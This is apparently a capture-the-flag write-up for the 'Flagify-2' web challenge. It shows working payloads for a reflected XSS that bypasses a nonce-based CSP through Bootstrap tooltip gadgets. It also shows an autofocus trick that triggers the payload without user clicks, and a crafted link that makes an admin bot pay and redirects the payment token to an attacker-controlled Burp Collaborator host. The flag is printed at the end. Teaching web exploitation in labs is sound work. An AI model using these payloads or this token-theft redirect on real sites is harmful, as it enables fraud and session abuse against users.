# 🚩 Flagify-2

## Challenge
```
The same site as before. Note that this time you can send links to an admin

Site: flagify-2.challs.cyberchallenge.it

Site: payflag-2.challs.cyberchallenge.it
```

## Writeup
In this challenge there are two websites. In the first there is a dummy Ecommerce with some articles. The item we need to buy is the *Flag* but it costs 100$ dollars and we only have 5$.

![Flagify Shop](images/flagify-shop.png)

The other website (Payflag) gives us 10$ on Sign up. On this second website there is also an interesting additional Page which is *Report* that says:
> The admin will check the link you provided. It (yeah, the admin is a bot) has infinite money!. Please don't spam

with an input to write down the URL to visit. We should definitely use this to retrieve the Flag.
The easiest way to solve this challenge is using a *Proxy* to intercept and modify requests. In this writeup I am using *Burp* (but you could also use OWASP ZAP to achieve the same result).

### Payment flow analysis

Let's analyse the payment flow for a stupid item to understand what happens when we click on the "BUY WITH PAYFLAG" button.
The flow is composed of 5 requests:

![Payment flow](images/payment-flow.png)

The first two requests are made to the *Flagify* website; after the second request we get redirected to the *Payflag* website where there is an *Authorization Request* to complete the payment.

![Authorization Request](images/authorization-request.png)

After we click on the **Yes** button a **POST** request is performed and, finally, we get redirected back to the *Flagify* website on the ``/callback`` endpoint with a token. After some tests I found that the thing we need to complete a payment is the ``token`` in that last ``/callback`` endpoint. So we just need to make the **bot** perform the POST request to buy the flag and somehow retrieve the token. Let's do this.

### Looking for XSS

We cannot just send the payment link to the **bot** because it would just perform a GET request; on the other hand we need to perform a **POST** request. We can notice that the *Authorization Requests* page (screenshot above) has the following URL: 

```
http://payflag-2.challs.cyberchallenge.it/pay?token=<token>&redirect_url=http://flagify-2.challs.cyberchallenge.it/callback
```

The ``redirect_url`` parameters gets reflected in the response. Can we perform XSS?
Unfortunately the server implements a strict *Content-Security-Policy* which is **nonce-based**:

![CSP](images/csp.png)

The good news is that nothing is **unbreakable**. Looking closely at the source code we can find this snippet of code at the end of the page:

![Page Source Code](images/page-source-code.png)

When dealing with CTFs we need to have the following **mindset**: 
> Everything is there for a reason.

This function comes from Bootstrap and looking more closely we can find the following **Gist**:
- [Bootstrap XSS Collection](https://gist.github.com/BlackFan/e968b5209637952cca1580dc8ffdfde6)

The first group of payloads in this list says "CSP strict-dynamic bypass": GREAT!
Let's try one of them by changing the ``redirect_url`` with one of those payloads and BAM: the second one works!

![First XSS](images/user-interaction-xss.png)

The problem is that it requires user interaction, can we overcome this problem?
The payload I found on that **gist** is the following:

```
<x data-toggle="tooltip" data-html="true" title='<script>alert(1)</script>'>XSS</x>
```

It uses a ``<x>`` tag to perform XSS, if we change it to ``<input>`` and add the **autofocus** option we can overcome the requirement of the user interaction:

```
<input autofocus data-toggle="tooltip" data-html="true" title='<script>alert(1)</script>'/>
```

### Payload all the things!

Now everything is in place. We just need to create the right payload to make the **bot** buy the flag for us. Let's look closely at the POST request we need to perform:

![POST request](images/post-request.png)

The body of the request contains:
- **accepted**: set to "ok"
- **csrf**: value that we can find in the page itself

On the other hand the query string of the URL contains:
- **token**: we need to use a token for that specific item
- **redirect_url**: the URL to redirect

In order to retrieve this flag we need to perform an XSS that makes a POST request with:
- **accepted** set to "ok"
- **csrf** dynamically taken from the page
- **token** we provide to the *bot*

In other words we just need to submit the form! A simple payload like the following should work:
```
document.getElementsByClassName('btn')[0].click()
```

The full payload becomes:
```
<input autofocus data-toggle="tooltip" data-html="true" title='<script>document.getElementsByClassName("btn")[0].click()</script>'/>
```

Now we need to craft the url to give to the **admin bot**. Let's go to the *Flagify* website and try to buy the flag with *Payflag*; we get the following result:

![Not enough money](images/not-enough-money.png)

But we can take the URL from the address bar and forge the malicious link for the **bot** just by changing the ``redirect_url`` parameter with the previous payload; we obtain something like the following:

```
http://payflag-2.challs.cyberchallenge.it/pay?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0b2tlbiI6IjgyZjMwYzJiZmQ0ZDVkZTgyZTlkNTMyZTExM2I2MDUwIiwicHJpY2UiOjEwMH0.mEVA3PJX8ACdQ0F71rQ2wBWJ-ezdZu_XGwZtsa-HNhY&redirect_url=%3Cinput%20autofocus%20data-toggle%3D%22tooltip%22%20data-html%3D%22true%22%20title%3D%27%3Cscript%3Edocument.getElementsByClassName%28%22btn%22%29%5B0%5D.click%28%29%3C%2Fscript%3E%27%2F%3E
```

**Notice that I URL Encoded the payload to avoid problems**

Now place this URL inside the form in the Report page and click on *Submit*. The page should return an **ok** message. The **bot admin** should have correctly completed the payment. But something is missing, how do we retrieve the **token**? The easiest solution is to take advantage of the redirection after the payment. If we slightly change the ``redirect_url`` and add at the beginning a domain we own we should receive a request with the token. For this purpose I am going to use **Burp Collaborator** but you can also use something like **ngrok**. The payload should become something like this:
```
http://payflag-2.challs.cyberchallenge.it/pay?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0b2tlbiI6IjgyZjMwYzJiZmQ0ZDVkZTgyZTlkNTMyZTExM2I2MDUwIiwicHJpY2UiOjEwMH0.mEVA3PJX8ACdQ0F71rQ2wBWJ-ezdZu_XGwZtsa-HNhY&redirect_url=https://jxkm8suljj30v4wpw11l331ig9mzao.burpcollaborator.net/%3Cinput%20autofocus%20data-toggle%3D%22tooltip%22%20data-html%3D%22true%22%20title%3D%27%3Cscript%3Edocument.getElementsByClassName%28%22btn%22%29%5B0%5D.click%28%29%3C%2Fscript%3E%27%2F%3E
```

Let's use again the *Report* feature and now we should receive a request on our Burp Collaborator instance (or in the *ngrok* logs):

![Burp Collaborator Interaction](images/burp-collaborator-interaction.png)

Now we just need to take the **token** and go to:
```
http://flagify-2.challs.cyberchallenge.it/callback?token=<token>
```

... and enjoy the flag!

![Flag](images/flag.png)

**FLAG**: CCIT{web_h4s_its_gadg3ts_to0}